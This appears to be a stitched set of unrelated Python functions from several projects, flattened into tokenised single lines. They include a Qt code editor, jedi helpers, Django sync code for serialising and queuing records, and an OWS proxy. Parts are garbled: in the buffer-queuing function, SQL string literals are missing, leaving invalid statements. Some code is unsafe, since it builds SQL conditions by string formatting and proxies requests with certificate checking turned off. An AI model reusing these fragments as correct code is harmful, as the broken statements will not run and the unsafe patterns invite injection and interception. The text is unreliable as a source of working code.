def _handle_indent_between_paren ( self , column , line , parent_impl , tc ) : pre , post = parent_impl next_char = self . _get_next_char ( tc ) prev_char = self . _get_prev_char ( tc ) prev_open = prev_char in [ '[' , '(' , '{' ] next_close = next_char in [ ']' , ')' , '}' ] ( open_line , open_symbol_col ) , ( close_line , close_col ) = self . _get_paren_pos ( tc , column ) open_line_txt = self . _helper . line_text ( open_line ) open_line_indent = len ( open_line_txt ) - len ( open_line_txt . lstrip ( ) ) if prev_open : post = ( open_line_indent + self . editor . tab_length ) * ' ' elif next_close and prev_char != ',' : post = open_line_indent * ' ' elif tc . block ( ) . blockNumber ( ) == open_line : post = open_symbol_col * ' ' # adapt indent if cursor on closing line and next line have same # indent -> PEP8 compliance if close_line and close_col : txt = self . _helper . line_text ( close_line ) bn = tc . block ( ) . blockNumber ( ) flg = bn == close_line next_indent = self . _helper . line_indent ( bn + 1 ) * ' ' if flg and txt . strip ( ) . endswith ( ':' ) and next_indent == post : # | look at how the previous line ( ``':'):`` ) was # over-indented, this is actually what we are trying to # achieve here post += self . editor . tab_length * ' ' # breaking string if next_char in [ '"' , "'" ] : tc . movePosition ( tc . Left ) is_string = self . _helper . is_comment_or_string ( tc , formats = [ 'string' ] ) if next_char in [ '"' , "'" ] : tc . movePosition ( tc . Right ) if is_string : trav = QTextCursor ( tc ) while self . _helper . is_comment_or_string ( trav , formats = [ 'string' ] ) : trav . movePosition ( trav . Left ) trav . movePosition ( trav . Right ) symbol = '%s' % self . _get_next_char ( trav ) pre += symbol post += symbol return pre , post
def _at_block_start ( tc , line ) : if tc . atBlockStart ( ) : return True column = tc . columnNumber ( ) indentation = len ( line ) - len ( line . lstrip ( ) ) return column <= indentation
def update_terminal_colors ( self ) : self . color_scheme = self . create_color_scheme ( background = self . syntax_highlighter . color_scheme . background , foreground = self . syntax_highlighter . color_scheme . formats [ 'normal' ] . foreground ( ) . color ( ) )
def setup_actions ( self ) : self . actionOpen . triggered . connect ( self . on_open ) self . actionNew . triggered . connect ( self . on_new ) self . actionSave . triggered . connect ( self . on_save ) self . actionSave_as . triggered . connect ( self . on_save_as ) self . actionQuit . triggered . connect ( QtWidgets . QApplication . instance ( ) . quit ) self . tabWidget . current_changed . connect ( self . on_current_tab_changed ) self . tabWidget . last_tab_closed . connect ( self . on_last_tab_closed ) self . actionAbout . triggered . connect ( self . on_about ) self . actionRun . triggered . connect ( self . on_run ) self . interactiveConsole . process_finished . connect ( self . on_process_finished ) self . actionConfigure_run . triggered . connect ( self . on_configure_run )
def on_new ( self ) : interpreter , pyserver , args = self . _get_backend_parameters ( ) self . setup_editor ( self . tabWidget . create_new_document ( extension = '.py' , interpreter = interpreter , server_script = pyserver , args = args ) ) self . actionRun . setDisabled ( True ) self . actionConfigure_run . setDisabled ( True )
def on_save_as ( self ) : path = self . tabWidget . current_widget ( ) . file . path path = os . path . dirname ( path ) if path else '' filename , filter = QtWidgets . QFileDialog . getSaveFileName ( self , 'Save' , path ) if filename : self . tabWidget . save_current ( filename ) self . recent_files_manager . open_file ( filename ) self . menu_recents . update_actions ( ) self . actionRun . setEnabled ( True ) self . actionConfigure_run . setEnabled ( True ) self . _update_status_bar ( self . tabWidget . current_widget ( ) )
def setup_mnu_style ( self , editor ) : menu = QtWidgets . QMenu ( 'Styles' , self . menuEdit ) group = QtWidgets . QActionGroup ( self ) self . styles_group = group current_style = editor . syntax_highlighter . color_scheme . name group . triggered . connect ( self . on_style_changed ) for s in sorted ( PYGMENTS_STYLES ) : a = QtWidgets . QAction ( menu ) a . setText ( s ) a . setCheckable ( True ) if s == current_style : a . setChecked ( True ) group . addAction ( a ) menu . addAction ( a ) self . menuEdit . addMenu ( menu )
def on_current_tab_changed ( self ) : self . menuEdit . clear ( ) self . menuModes . clear ( ) self . menuPanels . clear ( ) editor = self . tabWidget . current_widget ( ) self . menuEdit . setEnabled ( editor is not None ) self . menuModes . setEnabled ( editor is not None ) self . menuPanels . setEnabled ( editor is not None ) self . actionSave . setEnabled ( editor is not None ) self . actionSave_as . setEnabled ( editor is not None ) self . actionConfigure_run . setEnabled ( editor is not None ) self . actionRun . setEnabled ( editor is not None ) if editor is not None : self . setup_mnu_edit ( editor ) self . setup_mnu_modes ( editor ) self . setup_mnu_panels ( editor ) self . widgetOutline . set_editor ( editor ) self . _update_status_bar ( editor )
def on_run ( self ) : filename = self . tabWidget . current_widget ( ) . file . path wd = os . path . dirname ( filename ) args = Settings ( ) . get_run_config_for_file ( filename ) self . interactiveConsole . start_process ( Settings ( ) . interpreter , args = [ filename ] + args , cwd = wd ) self . dockWidget . show ( ) self . actionRun . setEnabled ( False ) self . actionConfigure_run . setEnabled ( False )
def goto_assignments ( request_data ) : code = request_data [ 'code' ] line = request_data [ 'line' ] + 1 column = request_data [ 'column' ] path = request_data [ 'path' ] # encoding = request_data['encoding'] encoding = 'utf-8' script = jedi . Script ( code , line , column , path , encoding ) try : definitions = script . goto_assignments ( ) except jedi . NotFoundError : pass else : ret_val = [ ( d . module_path , d . line - 1 if d . line else None , d . column , d . full_name ) for d in definitions ] return ret_val
def defined_names ( request_data ) : global _old_definitions ret_val = [ ] path = request_data [ 'path' ] toplvl_definitions = jedi . names ( request_data [ 'code' ] , path , 'utf-8' ) for d in toplvl_definitions : definition = _extract_def ( d , path ) if d . type != 'import' : ret_val . append ( definition ) ret_val = [ d . to_dict ( ) for d in ret_val ] return ret_val
def quick_doc ( request_data ) : code = request_data [ 'code' ] line = request_data [ 'line' ] + 1 column = request_data [ 'column' ] path = request_data [ 'path' ] # encoding = 'utf-8' encoding = 'utf-8' script = jedi . Script ( code , line , column , path , encoding ) try : definitions = script . goto_definitions ( ) except jedi . NotFoundError : return [ ] else : ret_val = [ d . docstring ( ) for d in definitions ] return ret_val
def make_python_patterns ( additional_keywords = [ ] , additional_builtins = [ ] ) : kw = r"\b" + any ( "keyword" , kwlist + additional_keywords ) + r"\b" kw_namespace = r"\b" + any ( "namespace" , kw_namespace_list ) + r"\b" word_operators = r"\b" + any ( "operator_word" , wordop_list ) + r"\b" builtinlist = [ str ( name ) for name in dir ( builtins ) if not name . startswith ( '_' ) ] + additional_builtins for v in [ 'None' , 'True' , 'False' ] : builtinlist . remove ( v ) builtin = r"([^.'\"\\#]\b|^)" + any ( "builtin" , builtinlist ) + r"\b" builtin_fct = any ( "builtin_fct" , [ r'_{2}[a-zA-Z_]*_{2}' ] ) comment = any ( "comment" , [ r"#[^\n]*" ] ) instance = any ( "instance" , [ r"\bself\b" , r"\bcls\b" ] ) decorator = any ( 'decorator' , [ r'@\w*' , r'.setter' ] ) number = any ( "number" , [ r"\b[+-]?[0-9]+[lLjJ]?\b" , r"\b[+-]?0[xX][0-9A-Fa-f]+[lL]?\b" , r"\b[+-]?0[oO][0-7]+[lL]?\b" , r"\b[+-]?0[bB][01]+[lL]?\b" , r"\b[+-]?[0-9]+(?:\.[0-9]+)?(?:[eE][+-]?[0-9]+)?[jJ]?\b" ] ) sqstring = r"(\b[rRuU])?'[^'\\\n]*(\\.[^'\\\n]*)*'?" dqstring = r'(\b[rRuU])?"[^"\\\n]*(\\.[^"\\\n]*)*"?' uf_sqstring = r"(\b[rRuU])?'[^'\\\n]*(\\.[^'\\\n]*)*(\\)$(?!')$" uf_dqstring = r'(\b[rRuU])?"[^"\\\n]*(\\.[^"\\\n]*)*(\\)$(?!")$' sq3string = r"(\b[rRuU])?'''[^'\\]*((\\.|'(?!''))[^'\\]*)*(''')?" dq3string = r'(\b[rRuU])?"""[^"\\]*((\\.|"(?!""))[^"\\]*)*(""")?' uf_sq3string = r"(\b[rRuU])?'''[^'\\]*((\\.|'(?!''))[^'\\]*)*(\\)?(?!''')$" uf_dq3string = r'(\b[rRuU])?"""[^"\\]*((\\.|"(?!""))[^"\\]*)*(\\)?(?!""")$' string = any ( "string" , [ sq3string , dq3string , sqstring , dqstring ] ) ufstring1 = any ( "uf_sqstring" , [ uf_sqstring ] ) ufstring2 = any ( "uf_dqstring" , [ uf_dqstring ] ) ufstring3 = any ( "uf_sq3string" , [ uf_sq3string ] ) ufstring4 = any ( "uf_dq3string" , [ uf_dq3string ] ) return "|" . join ( [ instance , decorator , kw , kw_namespace , builtin , word_operators , builtin_fct , comment , ufstring1 , ufstring2 , ufstring3 , ufstring4 , string , number , any ( "SYNC" , [ r"\n" ] ) ] )
def _unique ( self , seq ) : # order preserving checked = [ ] for e in seq : present = False for c in checked : if str ( c ) == str ( e ) : present = True break if not present : checked . append ( e ) return checked
def _substituteCheckPattern ( self , inputString , lineNumber , lastLineNumber , checkFileName , isForRegex ) : assert isinstance ( inputString , str ) assert isinstance ( lineNumber , int ) assert isinstance ( lastLineNumber , int ) assert isinstance ( checkFileName , str ) sPattern = r'\$\{LINE(\:(?P<sign>\+|-)(?P<offset>\d+))?\}' matcher = re . compile ( sPattern ) result = "" loop = True start = 0 end = len ( inputString ) # Not inclusive while loop : m = matcher . search ( inputString , start , end ) if not m : # No match so copy verbatim _logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += inputString [ start : end ] break # And we're done :) else : prevIndex = max ( 0 , m . start ( ) - 1 ) _logger . debug ( 'Previous character before match is at index {index} "{char}"' . format ( index = prevIndex , char = inputString [ prevIndex ] ) ) if inputString [ prevIndex ] == "\\" : # User asked to escape _logger . debug ( 'Substitution is escaped' ) _logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += inputString [ start : prevIndex ] # Copy before escaping character _logger . debug ( 'Result is currently "{}"' . format ( result ) ) result += inputString [ ( prevIndex + 1 ) : m . end ( ) ] # Copy the ${LINE..} verbatim start = min ( m . end ( ) , end ) _logger . debug ( 'Result is currently "{}"' . format ( result ) ) _logger . debug ( 'Next search is {start}:{end} = "{ss}"' . format ( start = start , end = end , ss = inputString [ start : end ] ) ) else : _logger . debug ( 'Result is currently "{}"' . format ( result ) ) _logger . debug ( 'Doing subsitution. Found at {begin}:{end} = {ss}' . format ( begin = m . start ( ) , end = m . end ( ) , ss = inputString [ m . start ( ) : m . end ( ) ] ) ) result += inputString [ start : m . start ( ) ] # Copy before substitution starts if m . groupdict ( ) [ 'sign' ] == None : # No offset just substitute line number _logger . debug ( 'No offset' ) result += str ( lineNumber ) else : offset = 1 if m . groupdict ( ) [ 'sign' ] == '+' else - 1 offset *= int ( m . groupdict ( ) [ 'offset' ] ) _logger . debug ( 'Offset is {}' . format ( offset ) ) requestedLineNumber = lineNumber + offset _logger . debug ( 'Request line number to print is  {}' . format ( requestedLineNumber ) ) if requestedLineNumber <= 0 : raise ParsingException ( '{file}:{line}:{col} offset gives line number < 1' . format ( file = checkFileName , line = lineNumber , col = m . start ( ) ) ) elif requestedLineNumber > lastLineNumber : raise ParsingException ( '{file}:{line}:{col} offset gives line number past the end of file' . format ( file = checkFileName , line = lineNumber , col = m . start ( ) ) ) result += str ( requestedLineNumber ) start = min ( m . end ( ) , end ) _logger . debug ( 'Next search is {start}:{end} = "{ss}"' . format ( start = start , end = end , ss = inputString [ start : end ] ) ) # Do ${CHECKFILE_NAME} substitution basenameCheckFileName = os . path . basename ( checkFileName ) assert basenameCheckFileName . count ( '\\' ) == 0 result = self . _simpleSubstitution ( "CHECKFILE_NAME" , basenameCheckFileName , result ) # Do ${CHECKFILE_ABS_PATH} substitution abspathCheckFileName = os . path . abspath ( checkFileName ) if isForRegex : # Note slash substitution is for Windows paths (e.g. "c:\mything\foo.txt") which can break regexes if we don't # correctly escape them. abspathCheckFileName = abspathCheckFileName . replace ( '\\' , '\\\\' ) result = self . _simpleSubstitution ( "CHECKFILE_ABS_PATH" , abspathCheckFileName , result ) assert len ( result ) != 0 return result
def find_libname ( self , name ) : names = [ "{}.lib" , "lib{}.lib" , "{}lib.lib" ] names = [ n . format ( name ) for n in names ] dirs = self . get_library_dirs ( ) for d in dirs : for n in names : if exists ( join ( d , n ) ) : return n [ : - 4 ] msg = "Could not find the {} library." . format ( name ) raise ValueError ( msg )
def finalize ( self ) : if self . __head_less : warn ( f'{self.__class__.__name__} configured to head less mode. finalize unusable' ) elif not self . __head_generate : warn ( f'{self.__class__.__name__} already finalized or fitted' ) elif not self . __head_dict : raise NotFittedError ( f'{self.__class__.__name__} instance is not fitted yet' ) else : if self . remove_rare_ratio : self . __clean_head ( * self . __head_rare ) self . __prepare_header ( ) self . __head_rare = None self . __head_generate = False
def fit ( self , x , y = None ) : x = iter2array ( x , dtype = ( MoleculeContainer , CGRContainer ) ) if self . __head_less : warn ( f'{self.__class__.__name__} configured to head less mode. fit unusable' ) return self self . _reset ( ) self . __prepare ( x ) return self
def _self_referential_fk ( klass_model ) : for f in klass_model . _meta . concrete_fields : if f . related_model : if issubclass ( klass_model , f . related_model ) : return f . attname return None
def serialize ( self ) : opts = self . _meta data = { } for f in opts . concrete_fields : if f . attname in self . morango_fields_not_to_serialize : continue if f . attname in self . _morango_internal_fields_not_to_serialize : continue # case if model is morango mptt if f . attname in getattr ( self , '_internal_mptt_fields_not_to_serialize' , '_internal_fields_not_to_serialize' ) : continue if hasattr ( f , 'value_from_object_json_compatible' ) : data [ f . attname ] = f . value_from_object_json_compatible ( self ) else : data [ f . attname ] = f . value_from_object ( self ) return data
def deserialize ( cls , dict_model ) : kwargs = { } for f in cls . _meta . concrete_fields : if f . attname in dict_model : kwargs [ f . attname ] = dict_model [ f . attname ] return cls ( * * kwargs )
def get_default ( self ) : if self . has_default ( ) : if callable ( self . default ) : default = self . default ( ) if isinstance ( default , uuid . UUID ) : return default . hex return default if isinstance ( self . default , uuid . UUID ) : return self . default . hex return self . default return None
def calculate_uuid ( self ) : # raise an error if no inputs to the UUID calculation were specified if self . uuid_input_fields is None : raise NotImplementedError ( ) # if the UUID has been set to be random, return a random UUID if self . uuid_input_fields == "RANDOM" : return uuid . uuid4 ( ) . hex # if we got this far, uuid_input_fields should be a tuple assert isinstance ( self . uuid_input_fields , tuple ) , "'uuid_input_fields' must either be a tuple or the string 'RANDOM'" # calculate the input to the UUID function hashable_input_vals = [ ] for field in self . uuid_input_fields : new_value = getattr ( self , field ) if new_value : hashable_input_vals . append ( str ( new_value ) ) hashable_input = ":" . join ( hashable_input_vals ) # if all the values were falsey, just return a random UUID, to avoid collisions if not hashable_input : return uuid . uuid4 ( ) . hex # compute the UUID as a function of the input values return sha2_uuid ( hashable_input )
def _serialize_into_store ( profile , filter = None ) : # ensure that we write and retrieve the counter in one go for consistency current_id = InstanceIDModel . get_current_instance_and_increment_counter ( ) with transaction . atomic ( ) : # create Q objects for filtering by prefixes prefix_condition = None if filter : prefix_condition = functools . reduce ( lambda x , y : x | y , [ Q ( _morango_partition__startswith = prefix ) for prefix in filter ] ) # filter through all models with the dirty bit turned on syncable_dict = _profile_models [ profile ] for ( _ , klass_model ) in six . iteritems ( syncable_dict ) : new_store_records = [ ] new_rmc_records = [ ] klass_queryset = klass_model . objects . filter ( _morango_dirty_bit = True ) if prefix_condition : klass_queryset = klass_queryset . filter ( prefix_condition ) store_records_dict = Store . objects . in_bulk ( id_list = klass_queryset . values_list ( 'id' , flat = True ) ) for app_model in klass_queryset : try : store_model = store_records_dict [ app_model . id ] # if store record dirty and app record dirty, append store serialized to conflicting data if store_model . dirty_bit : store_model . conflicting_serialized_data = store_model . serialized + "\n" + store_model . conflicting_serialized_data store_model . dirty_bit = False # set new serialized data on this store model ser_dict = json . loads ( store_model . serialized ) ser_dict . update ( app_model . serialize ( ) ) store_model . serialized = DjangoJSONEncoder ( ) . encode ( ser_dict ) # create or update instance and counter on the record max counter for this store model RecordMaxCounter . objects . update_or_create ( defaults = { 'counter' : current_id . counter } , instance_id = current_id . id , store_model_id = store_model . id ) # update last saved bys for this store model store_model . last_saved_instance = current_id . id store_model . last_saved_counter = current_id . counter # update deleted flags in case it was previously deleted store_model . deleted = False store_model . hard_deleted = False # update this model store_model . save ( ) except KeyError : kwargs = { 'id' : app_model . id , 'serialized' : DjangoJSONEncoder ( ) . encode ( app_model . serialize ( ) ) , 'last_saved_instance' : current_id . id , 'last_saved_counter' : current_id . counter , 'model_name' : app_model . morango_model_name , 'profile' : app_model . morango_profile , 'partition' : app_model . _morango_partition , 'source_id' : app_model . _morango_source_id , } # check if model has FK pointing to it and add the value to a field on the store self_ref_fk = _self_referential_fk ( klass_model ) if self_ref_fk : self_ref_fk_value = getattr ( app_model , self_ref_fk ) kwargs . update ( { '_self_ref_fk' : self_ref_fk_value or '' } ) # create store model and record max counter for the app model new_store_records . append ( Store ( * * kwargs ) ) new_rmc_records . append ( RecordMaxCounter ( store_model_id = app_model . id , instance_id = current_id . id , counter = current_id . counter ) ) # bulk create store and rmc records for this class Store . objects . bulk_create ( new_store_records ) RecordMaxCounter . objects . bulk_create ( new_rmc_records ) # set dirty bit to false for all instances of this model klass_queryset . update ( update_dirty_bit_to = False ) # get list of ids of deleted models deleted_ids = DeletedModels . objects . filter ( profile = profile ) . values_list ( 'id' , flat = True ) # update last_saved_bys and deleted flag of all deleted store model instances deleted_store_records = Store . objects . filter ( id__in = deleted_ids ) deleted_store_records . update ( dirty_bit = False , deleted = True , last_saved_instance = current_id . id , last_saved_counter = current_id . counter ) # update rmcs counters for deleted models that have our instance id RecordMaxCounter . objects . filter ( instance_id = current_id . id , store_model_id__in = deleted_ids ) . update ( counter = current_id . counter ) # get a list of deleted model ids that don't have an rmc for our instance id new_rmc_ids = deleted_store_records . exclude ( recordmaxcounter__instance_id = current_id . id ) . values_list ( "id" , flat = True ) # bulk create these new rmcs RecordMaxCounter . objects . bulk_create ( [ RecordMaxCounter ( store_model_id = r_id , instance_id = current_id . id , counter = current_id . counter ) for r_id in new_rmc_ids ] ) # clear deleted models table for this profile DeletedModels . objects . filter ( profile = profile ) . delete ( ) # handle logic for hard deletion models hard_deleted_ids = HardDeletedModels . objects . filter ( profile = profile ) . values_list ( 'id' , flat = True ) hard_deleted_store_records = Store . objects . filter ( id__in = hard_deleted_ids ) hard_deleted_store_records . update ( hard_deleted = True , serialized = '{}' , conflicting_serialized_data = '' ) HardDeletedModels . objects . filter ( profile = profile ) . delete ( ) # update our own database max counters after serialization if not filter : DatabaseMaxCounter . objects . update_or_create ( instance_id = current_id . id , partition = "" , defaults = { 'counter' : current_id . counter } ) else : for f in filter : DatabaseMaxCounter . objects . update_or_create ( instance_id = current_id . id , partition = f , defaults = { 'counter' : current_id . counter } )
def _deserialize_from_store ( profile ) : # we first serialize to avoid deserialization merge conflicts _serialize_into_store ( profile ) fk_cache = { } with transaction . atomic ( ) : syncable_dict = _profile_models [ profile ] excluded_list = [ ] # iterate through classes which are in foreign key dependency order for model_name , klass_model in six . iteritems ( syncable_dict ) : # handle cases where a class has a single FK reference to itself self_ref_fk = _self_referential_fk ( klass_model ) query = Q ( model_name = klass_model . morango_model_name ) for klass in klass_model . morango_model_dependencies : query |= Q ( model_name = klass . morango_model_name ) if self_ref_fk : clean_parents = Store . objects . filter ( dirty_bit = False , profile = profile ) . filter ( query ) . char_ids_list ( ) dirty_children = Store . objects . filter ( dirty_bit = True , profile = profile ) . filter ( Q ( _self_ref_fk__in = clean_parents ) | Q ( _self_ref_fk = '' ) ) . filter ( query ) # keep iterating until size of dirty_children is 0 while len ( dirty_children ) > 0 : for store_model in dirty_children : try : app_model = store_model . _deserialize_store_model ( fk_cache ) if app_model : with mute_signals ( signals . pre_save , signals . post_save ) : app_model . save ( update_dirty_bit_to = False ) # we update a store model after we have deserialized it to be able to mark it as a clean parent store_model . dirty_bit = False store_model . save ( update_fields = [ 'dirty_bit' ] ) except exceptions . ValidationError : # if the app model did not validate, we leave the store dirty bit set excluded_list . append ( store_model . id ) # update lists with new clean parents and dirty children clean_parents = Store . objects . filter ( dirty_bit = False , profile = profile ) . filter ( query ) . char_ids_list ( ) dirty_children = Store . objects . filter ( dirty_bit = True , profile = profile , _self_ref_fk__in = clean_parents ) . filter ( query ) else : # array for holding db values from the fields of each model for this class db_values = [ ] fields = klass_model . _meta . fields for store_model in Store . objects . filter ( model_name = model_name , profile = profile , dirty_bit = True ) : try : app_model = store_model . _deserialize_store_model ( fk_cache ) # if the model was not deleted add its field values to the list if app_model : for f in fields : value = getattr ( app_model , f . attname ) db_value = f . get_db_prep_value ( value , connection ) db_values . append ( db_value ) except exceptions . ValidationError : # if the app model did not validate, we leave the store dirty bit set excluded_list . append ( store_model . id ) if db_values : # number of rows to update num_of_rows = len ( db_values ) // len ( fields ) # create '%s' placeholders for a single row placeholder_tuple = tuple ( [ '%s' for _ in range ( len ( fields ) ) ] ) # create list of the '%s' tuple placeholders based on number of rows to update placeholder_list = [ str ( placeholder_tuple ) for _ in range ( num_of_rows ) ] with connection . cursor ( ) as cursor : DBBackend . _bulk_insert_into_app_models ( cursor , klass_model . _meta . db_table , fields , db_values , placeholder_list ) # clear dirty bit for all store models for this profile except for models that did not validate Store . objects . exclude ( id__in = excluded_list ) . filter ( profile = profile , dirty_bit = True ) . update ( dirty_bit = False )
def _queue_into_buffer ( transfersession ) : last_saved_by_conditions = [ ] filter_prefixes = Filter ( transfersession . filter ) server_fsic = json . loads ( transfersession . server_fsic ) client_fsic = json . loads ( transfersession . client_fsic ) if transfersession . push : fsics = _fsic_queuing_calc ( client_fsic , server_fsic ) else : fsics = _fsic_queuing_calc ( server_fsic , client_fsic ) # if fsics are identical or receiving end has newer data, then there is nothing to queue if not fsics : return # create condition for all push FSICs where instance_ids are equal, but internal counters are higher than FSICs counters for instance , counter in six . iteritems ( fsics ) : last_saved_by_conditions += [ "(last_saved_instance = '{0}' AND last_saved_counter > {1})" . format ( instance , counter ) ] if fsics : last_saved_by_conditions = [ _join_with_logical_operator ( last_saved_by_conditions , 'OR' ) ] partition_conditions = [ ] # create condition for filtering by partitions for prefix in filter_prefixes : partition_conditions += [ "partition LIKE '{}%'" . format ( prefix ) ] if filter_prefixes : partition_conditions = [ _join_with_logical_operator ( partition_conditions , 'OR' ) ] # combine conditions fsic_and_partition_conditions = _join_with_logical_operator ( last_saved_by_conditions + partition_conditions , 'AND' ) # filter by profile where_condition = _join_with_logical_operator ( [ fsic_and_partition_conditions , "profile = '{}'" . format ( transfersession . sync_session . profile ) ] , 'AND' ) # execute raw sql to take all records that match condition, to be put into buffer for transfer with connection . cursor ( ) as cursor : queue_buffer = . format ( outgoing_buffer = Buffer . _meta . db_table , transfer_session_id = transfersession . id , condition = where_condition , store = Store . _meta . db_table ) cursor . execute ( queue_buffer ) # take all record max counters that are foreign keyed onto store models, which were queued into the buffer queue_rmc_buffer = . format ( outgoing_rmcb = RecordMaxCounterBuffer . _meta . db_table , transfer_session_id = transfersession . id , record_max_counter = RecordMaxCounter . _meta . db_table , outgoing_buffer = Buffer . _meta . db_table ) cursor . execute ( queue_rmc_buffer )
def _dequeue_into_store ( transfersession ) : with connection . cursor ( ) as cursor : DBBackend . _dequeuing_delete_rmcb_records ( cursor , transfersession . id ) DBBackend . _dequeuing_delete_buffered_records ( cursor , transfersession . id ) current_id = InstanceIDModel . get_current_instance_and_increment_counter ( ) DBBackend . _dequeuing_merge_conflict_buffer ( cursor , current_id , transfersession . id ) DBBackend . _dequeuing_merge_conflict_rmcb ( cursor , transfersession . id ) DBBackend . _dequeuing_update_rmcs_last_saved_by ( cursor , current_id , transfersession . id ) DBBackend . _dequeuing_delete_mc_rmcb ( cursor , transfersession . id ) DBBackend . _dequeuing_delete_mc_buffer ( cursor , transfersession . id ) DBBackend . _dequeuing_insert_remaining_buffer ( cursor , transfersession . id ) DBBackend . _dequeuing_insert_remaining_rmcb ( cursor , transfersession . id ) DBBackend . _dequeuing_delete_remaining_rmcb ( cursor , transfersession . id ) DBBackend . _dequeuing_delete_remaining_buffer ( cursor , transfersession . id ) if getattr ( settings , 'MORANGO_DESERIALIZE_AFTER_DEQUEUING' , True ) : _deserialize_from_store ( transfersession . sync_session . profile )
def _multiple_self_ref_fk_check ( class_model ) : self_fk = [ ] for f in class_model . _meta . concrete_fields : if f . related_model in self_fk : return True if f . related_model == class_model : self_fk . append ( class_model ) return False
def save_service ( self , service , overwrite = True ) : name = namesgenerator . get_sane_name ( service . name ) if not name : name = namesgenerator . get_random_name ( ) if self . collection . count_documents ( { 'name' : name } ) > 0 : name = namesgenerator . get_random_name ( retry = True ) # check if service is already registered if self . collection . count_documents ( { 'name' : name } ) > 0 : if overwrite : self . collection . delete_one ( { 'name' : name } ) else : raise Exception ( "service name already registered." ) self . collection . insert_one ( Service ( name = name , url = baseurl ( service . url ) , type = service . type , purl = service . purl , public = service . public , auth = service . auth , verify = service . verify ) ) return self . fetch_by_name ( name = name )
def list_services ( self ) : my_services = [ ] for service in self . collection . find ( ) . sort ( 'name' , pymongo . ASCENDING ) : my_services . append ( Service ( service ) ) return my_services
def fetch_by_name ( self , name ) : service = self . collection . find_one ( { 'name' : name } ) if not service : raise ServiceNotFound return Service ( service )
def fetch_by_url ( self , url ) : service = self . collection . find_one ( { 'url' : url } ) if not service : raise ServiceNotFound return Service ( service )
def owsproxy_delegate ( request ) : twitcher_url = request . registry . settings . get ( 'twitcher.url' ) protected_path = request . registry . settings . get ( 'twitcher.ows_proxy_protected_path' , '/ows' ) url = twitcher_url + protected_path + '/proxy' if request . matchdict . get ( 'service_name' ) : url += '/' + request . matchdict . get ( 'service_name' ) if request . matchdict . get ( 'access_token' ) : url += '/' + request . matchdict . get ( 'service_name' ) url += '?' + urlparse . urlencode ( request . params ) LOGGER . debug ( "delegate to owsproxy: %s" , url ) # forward request to target (without Host Header) # h = dict(request.headers) # h.pop("Host", h) resp = requests . request ( method = request . method . upper ( ) , url = url , data = request . body , headers = request . headers , verify = False ) return Response ( resp . content , status = resp . status_code , headers = resp . headers )
def main ( global_config , * * settings ) : from pyramid . config import Configurator config = Configurator ( settings = settings ) # include twitcher components config . include ( 'twitcher.config' ) config . include ( 'twitcher.frontpage' ) config . include ( 'twitcher.rpcinterface' ) config . include ( 'twitcher.owsproxy' ) # tweens/middleware # TODO: maybe add tween for exception handling or use unknown_failure view config . include ( 'twitcher.tweens' ) config . scan ( ) return config . make_wsgi_app ( )
def save_service ( self , service , overwrite = True ) : name = namesgenerator . get_sane_name ( service . name ) if not name : name = namesgenerator . get_random_name ( ) if name in self . name_index : name = namesgenerator . get_random_name ( retry = True ) # check if service is already registered if name in self . name_index : if overwrite : self . _delete ( name = name ) else : raise Exception ( "service name already registered." ) self . _insert ( Service ( name = name , url = baseurl ( service . url ) , type = service . type , purl = service . purl , public = service . public , auth = service . auth , verify = service . verify ) ) return self . fetch_by_name ( name = name )
def list_services ( self ) : my_services = [ ] for service in self . name_index . values ( ) : my_services . append ( Service ( service ) ) return my_services
def fetch_by_name ( self , name ) : service = self . name_index . get ( name ) if not service : raise ServiceNotFound return Service ( service )
def _get_param ( self , param , allowed_values = None , optional = False ) : request_params = self . _request_params ( ) if param in request_params : value = request_params [ param ] . lower ( ) if allowed_values is not None : if value in allowed_values : self . params [ param ] = value else : raise OWSInvalidParameterValue ( "%s %s is not supported" % ( param , value ) , value = param ) elif optional : self . params [ param ] = None else : raise OWSMissingParameterValue ( 'Parameter "%s" is missing' % param , value = param ) return self . params [ param ]
def _get_version ( self ) : version = self . _get_param ( param = "version" , allowed_values = allowed_versions [ self . params [ 'service' ] ] , optional = True ) if version is None and self . _get_request_type ( ) != "getcapabilities" : raise OWSMissingParameterValue ( 'Parameter "version" is missing' , value = "version" ) else : return version
def _get_service ( self ) : if "service" in self . document . attrib : value = self . document . attrib [ "service" ] . lower ( ) if value in allowed_service_types : self . params [ "service" ] = value else : raise OWSInvalidParameterValue ( "Service %s is not supported" % value , value = "service" ) else : raise OWSMissingParameterValue ( 'Parameter "service" is missing' , value = "service" ) return self . params [ "service" ]
def _get_request_type ( self ) : value = self . document . tag . lower ( ) if value in allowed_request_types [ self . params [ 'service' ] ] : self . params [ "request" ] = value else : raise OWSInvalidParameterValue ( "Request type %s is not supported" % value , value = "request" ) return self . params [ "request" ]
def _get_version ( self ) : if "version" in self . document . attrib : value = self . document . attrib [ "version" ] . lower ( ) if value in allowed_versions [ self . params [ 'service' ] ] : self . params [ "version" ] = value else : raise OWSInvalidParameterValue ( "Version %s is not supported" % value , value = "version" ) elif self . _get_request_type ( ) == "getcapabilities" : self . params [ "version" ] = None else : raise OWSMissingParameterValue ( 'Parameter "version" is missing' , value = "version" ) return self . params [ "version" ]
def localize_datetime ( dt , tz_name = 'UTC' ) : tz_aware_dt = dt if dt . tzinfo is None : utc = pytz . timezone ( 'UTC' ) aware = utc . localize ( dt ) timezone = pytz . timezone ( tz_name ) tz_aware_dt = aware . astimezone ( timezone ) else : logger . warn ( 'tzinfo already set' ) return tz_aware_dt
def baseurl ( url ) : parsed_url = urlparse . urlparse ( url ) if not parsed_url . netloc or parsed_url . scheme not in ( "http" , "https" ) : raise ValueError ( 'bad url' ) service_url = "%s://%s%s" % ( parsed_url . scheme , parsed_url . netloc , parsed_url . path . strip ( ) ) return service_url
def verify ( self ) : value = self . get ( 'verify' , 'true' ) if isinstance ( value , bool ) : verify = value elif value . lower ( ) == 'true' : verify = True elif value . lower ( ) == 'false' : verify = False else : verify = value return verify
def tag ( self , label , message = None ) : notify . warning ( 'Unsupported SCM: Make sure you apply the "{}" tag after commit!{}' . format ( label , ' [message={}]' . format ( message ) if message else '' , ) )
def pep440_dev_version ( self , verbose = False , non_local = False ) : # Always return a timestamp pep440 = '.dev{:%Y%m%d%H%M}' . format ( datetime . now ( ) ) if not non_local : build_number = os . environ . get ( 'BUILD_NUMBER' , 'n/a' ) if build_number . isdigit ( ) : pep440 += '+ci.{}' . format ( build_number ) if verbose : notify . info ( "Adding CI build ID #{} to version" . format ( build_number ) ) return pep440
